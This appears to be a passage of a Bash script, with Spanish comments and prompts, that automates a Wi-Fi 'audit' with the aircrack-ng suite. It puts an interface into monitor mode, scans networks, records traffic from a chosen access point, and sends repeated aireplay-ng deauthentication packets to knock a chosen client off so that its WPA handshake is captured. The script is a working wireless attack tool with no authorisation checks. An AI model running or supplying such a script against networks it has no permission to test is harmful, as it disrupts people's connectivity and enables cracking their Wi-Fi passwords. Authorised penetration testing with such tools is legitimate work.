echo -e "\e[1;31m$(cat chlog)\e[0m"
echo ""

# Crea una carpeta donde se guardara todo

mkdir Auditoria_$(date +%Y-%m-%d)
cd Auditoria_$(date +%Y-%m-%d)

echo -e "\033[32m[-] Interfaces Disponibles:\033[0m"
echo ""

# Lista las interfaces disponibles

ifconfig

read -p $'\e[33m[-] Escribe el nombre de tu interfaz: \e[0m ' interfazmon

# coloca la interfaz en modo monitor

sudo airmong-ng check kill
sudo airmon-ng start $interfazmon

echo -e "\033[31m[-] Colocando tu interfaz en modo monitor..\033[0m"

clear

echo -e "\033[32m[-] Tu interfaz fue puesta en modo monitor, nueva lista de interfaces disponibles:\033[0m"
echo ""

# Lista las interfaces disponibles

ifconfig

read -p $'\e[33m[-] Escribe el nombre de tu interfaz en modo monitor: \e[0m ' interfaz

# Abre una nueva terminal para visualizar las redes wifi disponibles

echo -e "\033[31m[-] Buscando las redes disponibles a auditar... No cierre la terminal\033[0m"
echo ""

kitty --hold bash -c "sudo airodump-ng '$interfaz'; exec bash" 2>/dev/null &


clear

# Salida de las redes disponibles para auditar

echo -e "\033[32m[-] Escaneo en proceso...\033[0m"

echo ""

# Panel para que el usuario pueda ingresar los datos para realizar la auditoria

read -p $'\e[33m[-] Ingresa el BSSID de la red a auditar: \e[0m ' bssid

echo "$bssid" > bssid.txt

echo ""

read -p $'\e[33m[-] Ingresa el canal de la red a auditar: \e[0m ' ch

echo ""

kitty --hold bash -c "sudo airodump-ng -c '$ch' --bssid '$bssid' -w Auditoria '$interfaz'; exec bash" 2>/dev/null &

clear

read -p $'\e[33m[-] Ingresa la estacion de la red a auditar: \e[0m ' station
echo ""

clear
echo -e "\033[32m[-] Lanzando paquetes\033[0m"
echo ""
sudo aireplay-ng -0 9 -a $bssid -c $station $interfaz

until [ "$pkgrespnd" = "n" ]
do

echo ""
read -p $'\e[32m[-] ¿Desea volver a enviar paquetes? y/n \e[0m ' pkgrespnd

case $pkgrespnd in

	"y") 
	echo ""
	echo -e "\033[32m[-] Lanzando paquetes\033[0m"
	echo ""
	sudo aireplay-ng -0 9 -a $bssid -c $station $interfaz
	;;

	"n")
	clear
	echo -e "\033[33m[-] Handshake capturado, volviendo al menu principal\033[0m"
	echo ""
	;;

	*)
	echo ""
	echo -e "\033[31m[-] Opcion Invalida, vuelva a intentarlo.\033[0m"
	echo ""
	;;


# Termina el menu de casos
esac

# termina el bucle de el menu principal
done

